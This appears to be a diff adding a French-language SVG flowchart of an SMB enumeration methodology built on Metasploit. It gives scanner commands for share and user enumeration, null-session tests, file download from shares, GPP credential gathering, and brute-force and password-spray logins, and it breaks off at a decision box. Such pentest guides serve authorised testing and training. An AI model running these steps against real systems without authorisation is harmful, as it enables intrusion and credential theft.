@@ -1,0 +1,475 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="1890" height="4655" viewBox="0 0 1890 4655"
+     xmlns="http://www.w3.org/2000/svg">
+<defs>
+  <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto" fill="#484f58">
+    <polygon points="0 0, 10 3.5, 0 7" />
+  </marker>
+</defs>
+<rect width="1890" height="4655" fill="#0d1117"/>
+<text x="945.0" y="28" text-anchor="middle" font-family="Segoe UI, sans-serif"
+      font-size="13" font-weight="bold" fill="#8b949e">SMB ENUMERATION — METASPLOIT FRAMEWORK EDITION</text>
+
+<rect x="673" y="43" width="540" height="175" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="40" width="540" height="175" rx="8" fill="#0d1117" stroke="#8957e5" stroke-width="2"/>
+<rect x="670" y="40" width="540" height="36" rx="8" fill="#8957e5" fill-opacity="0.15"/>
+<rect x="670" y="68" width="540" height="8" fill="#8957e5" fill-opacity="0.15"/>
+<rect x="1146.5" y="48" width="53.5" height="20" rx="4" fill="#8957e5" fill-opacity="0.3"/>
+<text x="1173.25" y="62" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#8957e5">START</text>
+<text x="686" y="64" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">1. Lancer Metasploit</text>
+<rect x="686" y="88" width="500" height="24" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="104" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msfconsole</text>
+<rect x="686" y="120" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="136" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Workspace dédié :</text>
+<text x="694" y="152" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; workspace -a smb_enum</text>
+<text x="686" y="172" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Les workspaces isolent les résultats par engagement.</text>
+<rect x="673" y="253" width="540" height="299" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="250" width="540" height="299" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="250" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="278" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="258" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="272" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="274" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">2. Scan de ports — Discovery SMB</text>
+<rect x="686" y="298" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="314" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/portscan/tcp</text>
+<text x="694" y="330" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP_CIBLE&gt;</text>
+<text x="694" y="346" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set PORTS 139,445</text>
+<text x="694" y="362" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set THREADS 10</text>
+<text x="694" y="378" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="394" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="410" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Ou importer un scan nmap :</text>
+<text x="694" y="426" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; db_nmap -sV -sC -p 139,445 &lt;IP_CIBLE&gt;</text>
+<rect x="686" y="442" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="458" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Voir les résultats :</text>
+<text x="694" y="474" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; services -p 445</text>
+<text x="694" y="490" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; hosts</text>
+<text x="686" y="510" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 db_nmap stocke les résultats dans la DB MSF.</text>
+<rect x="673" y="587" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="584" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="670" y="584" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="670" y="612" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1124.0" y="592" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1162.0" y="606" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="686" y="608" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Port 445 ou 139 ouvert ?</text>
+<rect x="1303" y="587" width="540" height="223" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="584" width="540" height="223" rx="8" fill="#0d1117" stroke="#da3633" stroke-width="2"/>
+<rect x="1300" y="584" width="540" height="36" rx="8" fill="#da3633" fill-opacity="0.15"/>
+<rect x="1300" y="612" width="540" height="8" fill="#da3633" fill-opacity="0.15"/>
+<rect x="1754.0" y="592" width="76.0" height="20" rx="4" fill="#da3633" fill-opacity="0.3"/>
+<text x="1792.0" y="606" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#da3633">DEAD END</text>
+<text x="1316" y="608" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">SMB non trouvé — Scan complet</text>
+<rect x="1316" y="632" width="500" height="24" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="648" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; db_nmap -sV -p- --min-rate 1000 &lt;IP&gt;</text>
+<rect x="1316" y="664" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="680" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Vérifier UDP 137 (NetBIOS) :</text>
+<text x="1324" y="696" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/netbios/nbname</text>
+<text x="1324" y="712" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="728" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="744" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="760" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Si rien : pivoter vers autre service</text>
+<text x="1324" y="776" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; services</text>
+<rect x="673" y="845" width="540" height="239" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="842" width="540" height="239" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="842" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="870" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="850" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="864" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="866" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">3. Identifier Version SMB + OS</text>
+<rect x="686" y="890" width="500" height="56" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="906" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_version</text>
+<text x="694" y="922" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="694" y="938" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="954" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="970" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Résultat typique :</text>
+<text x="694" y="986" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># [+] SMB Detected: Windows 10 Pro 19041</text>
+<text x="694" y="1002" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># [+] SMB Version: 3.1.1</text>
+<text x="694" y="1018" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># [+] Samba 4.15.13-Debian</text>
+<text x="686" y="1038" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 SMBv1 actif → vérifier EternalBlue (branche droite).</text>
+<rect x="673" y="1119" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="1116" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="670" y="1116" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="670" y="1144" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1124.0" y="1124" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1162.0" y="1138" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="686" y="1140" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Samba (Linux) ou Windows ?</text>
+<rect x="43" y="1259" width="540" height="363" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="1256" width="540" height="363" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="40" y="1256" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="40" y="1284" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="509.0" y="1264" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="539.5" y="1278" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="56" y="1280" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">4a. Énumération Samba (Linux)</text>
+<rect x="56" y="1304" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="1320" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Lister les partages :</text>
+<text x="64" y="1336" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</text>
+<text x="64" y="1352" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="64" y="1368" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set ShowFiles true</text>
+<text x="64" y="1384" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="56" y="1400" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="1416" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Lister les utilisateurs via RPC :</text>
+<text x="64" y="1432" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumusers</text>
+<text x="64" y="1448" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="64" y="1464" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="56" y="1480" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="1496" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># RID brute-force (si enum bloqué) :</text>
+<text x="64" y="1512" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_lookupsid</text>
+<text x="64" y="1528" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="64" y="1544" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set MaxRID 2000</text>
+<text x="64" y="1560" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="56" y="1580" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 ShowFiles true = liste aussi le contenu des shares.</text>
+<rect x="1303" y="1259" width="540" height="347" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="1256" width="540" height="347" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="1300" y="1256" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1300" y="1284" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1769.0" y="1264" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1799.5" y="1278" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="1316" y="1280" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">4b. Énumération Windows</text>
+<rect x="1316" y="1304" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="1320" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Partages :</text>
+<text x="1324" y="1336" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</text>
+<text x="1324" y="1352" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="1368" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set ShowFiles true</text>
+<text x="1324" y="1384" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="1400" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="1416" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Utilisateurs :</text>
+<text x="1324" y="1432" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumusers</text>
+<text x="1324" y="1448" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="1464" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="1480" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="1496" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># SID lookup / RID cycling :</text>
+<text x="1324" y="1512" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_lookupsid</text>
+<text x="1324" y="1528" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="1544" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="1316" y="1564" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 smb_lookupsid fonctionne souvent même sans creds.</text>
+<rect x="673" y="1657" width="540" height="271" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="1654" width="540" height="271" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="670" y="1654" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="670" y="1682" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1139.0" y="1662" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1169.5" y="1676" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="686" y="1678" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">5. Tester Session Nulle (Anonymous)</text>
+<rect x="686" y="1702" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="1718" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_login</text>
+<text x="694" y="1734" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="694" y="1750" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser &quot;&quot;</text>
+<text x="694" y="1766" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &quot;&quot;</text>
+<text x="694" y="1782" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="686" y="1798" width="500" height="72" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="694" y="1814" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Tester aussi Guest :</text>
+<text x="694" y="1830" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBUser guest</text>
+<text x="694" y="1846" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass &quot;&quot;</text>
+<text x="694" y="1862" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="686" y="1882" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Guest souvent désactivé sur Windows mais ça vaut le test.</text>
+<rect x="673" y="1963" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="670" y="1960" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="670" y="1960" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="670" y="1988" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1124.0" y="1968" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1162.0" y="1982" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="686" y="1984" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Session nulle / Guest acceptée ?</text>
+<rect x="43" y="2068" width="540" height="323" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="2065" width="540" height="323" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="40" y="2065" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="40" y="2093" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="509.0" y="2073" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="539.5" y="2087" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="56" y="2089" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">6. Lister + Explorer les Partages</text>
+<rect x="56" y="2113" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="2129" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_enumshares</text>
+<text x="64" y="2145" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="64" y="2161" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SpiderShares true</text>
+<text x="64" y="2177" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set ShowFiles true</text>
+<text x="64" y="2193" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="56" y="2209" width="500" height="104" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="2225" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Télécharger un fichier :</text>
+<text x="64" y="2241" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/admin/smb/download_file</text>
+<text x="64" y="2257" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="64" y="2273" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBSHARE &lt;share_name&gt;</text>
+<text x="64" y="2289" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RPATH &lt;chemin/fichier&gt;</text>
+<text x="64" y="2305" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<text x="56" y="2325" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Chercher : .txt .conf .xml .bak .ps1 .kdbx</text>
+<text x="56" y="2345" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Noms avec &#x27;password&#x27;, &#x27;cred&#x27;, &#x27;config&#x27;, &#x27;backup&#x27;</text>
+<rect x="43" y="2426" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="2423" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="40" y="2423" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="40" y="2451" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="494.0" y="2431" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="532.0" y="2445" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="56" y="2447" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Fichiers sensibles trouvés ?</text>
+<rect x="43" y="2531" width="540" height="235" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="2528" width="540" height="235" rx="8" fill="#0d1117" stroke="#238636" stroke-width="2"/>
+<rect x="40" y="2528" width="540" height="36" rx="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="40" y="2556" width="540" height="8" fill="#238636" fill-opacity="0.15"/>
+<rect x="501.5" y="2536" width="68.5" height="20" rx="4" fill="#238636" fill-opacity="0.3"/>
+<text x="535.75" y="2550" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#238636">SUCCESS</text>
+<text x="56" y="2552" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">7a. Analyser les fichiers extraits</text>
+<rect x="56" y="2576" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="2592" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Fichiers dans ~/.msf4/loot/</text>
+<text x="64" y="2608" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; loot</text>
+<rect x="56" y="2624" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="2640" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># GPP passwords :</text>
+<text x="64" y="2656" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use post/windows/gather/credentials/gpp</text>
+<rect x="56" y="2672" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="64" y="2688" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Chercher dans les fichiers :</text>
+<text x="64" y="2704" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># grep -ri &#x27;password\|passwd\|pwd&#x27; loot/</text>
+<text x="56" y="2724" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 GPP passwords : gpp-decrypt &lt;hash_base64&gt;</text>
+<rect x="43" y="2801" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="40" y="2798" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="40" y="2798" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="40" y="2826" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="494.0" y="2806" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="532.0" y="2820" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="56" y="2822" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Creds trouvés dans les fichiers ?</text>
+<rect x="1303" y="2068" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="2065" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="1300" y="2065" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1300" y="2093" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1754.0" y="2073" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1792.0" y="2087" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
+<text x="1316" y="2089" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">Identifiants disponibles ?</text>
+<rect x="1303" y="2531" width="540" height="383" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="2528" width="540" height="383" rx="8" fill="#0d1117" stroke="#1f6feb" stroke-width="2"/>
+<rect x="1300" y="2528" width="540" height="36" rx="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1300" y="2556" width="540" height="8" fill="#1f6feb" fill-opacity="0.15"/>
+<rect x="1769.0" y="2536" width="61.0" height="20" rx="4" fill="#1f6feb" fill-opacity="0.3"/>
+<text x="1799.5" y="2550" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#1f6feb">ACTION</text>
+<text x="1316" y="2552" font-family="Segoe UI, sans-serif" font-size="15" font-weight="bold" fill="#e6edf3">8. Brute-Force SMB</text>
+<rect x="1316" y="2576" width="500" height="120" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="2592" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; use auxiliary/scanner/smb/smb_login</text>
+<text x="1324" y="2608" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set RHOSTS &lt;IP&gt;</text>
+<text x="1324" y="2624" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set USER_FILE /usr/share/wordlists/users.txt</text>
+<text x="1324" y="2640" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set PASS_FILE /usr/share/wordlists/rockyou.txt</text>
+<text x="1324" y="2656" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set STOP_ON_SUCCESS true</text>
+<text x="1324" y="2672" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set THREADS 5</text>
+<text x="1324" y="2688" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="2704" width="500" height="88" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="2720" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Password spray (1 pass, N users) :</text>
+<text x="1324" y="2736" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set SMBPass Password1</text>
+<text x="1324" y="2752" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">set USER_FILE users.txt</text>
+<text x="1324" y="2768" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">unset PASS_FILE</text>
+<text x="1324" y="2784" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">run</text>
+<rect x="1316" y="2800" width="500" height="40" rx="4" fill="#161b22" stroke="#30363d" stroke-width="1"/>
+<text x="1324" y="2816" font-family="Consolas, Courier New, monospace" font-size="12" fill="#8b949e"># Voir creds trouvés :</text>
+<text x="1324" y="2832" font-family="Consolas, Courier New, monospace" font-size="12" fill="#7ee787">msf6 &gt; creds</text>
+<text x="1316" y="2852" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 Vérifier la politique de lockout AVANT le brute !</text>
+<text x="1316" y="2872" font-family="Segoe UI, sans-serif" font-size="11" fill="#8b949e">💡 STOP_ON_SUCCESS évite de verrouiller les comptes.</text>
+<rect x="1303" y="2949" width="540" height="70" rx="8" fill="#010409" fill-opacity="0.6"/>
+<rect x="1300" y="2946" width="540" height="70" rx="8" fill="#0d1117" stroke="#d29922" stroke-width="2"/>
+<rect x="1300" y="2946" width="540" height="36" rx="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1300" y="2974" width="540" height="8" fill="#d29922" fill-opacity="0.15"/>
+<rect x="1754.0" y="2954" width="76.0" height="20" rx="4" fill="#d29922" fill-opacity="0.3"/>
+<text x="1792.0" y="2968" text-anchor="middle" font-family="monospace" font-size="10" font-weight="bold" fill="#d29922">DECISION</text>
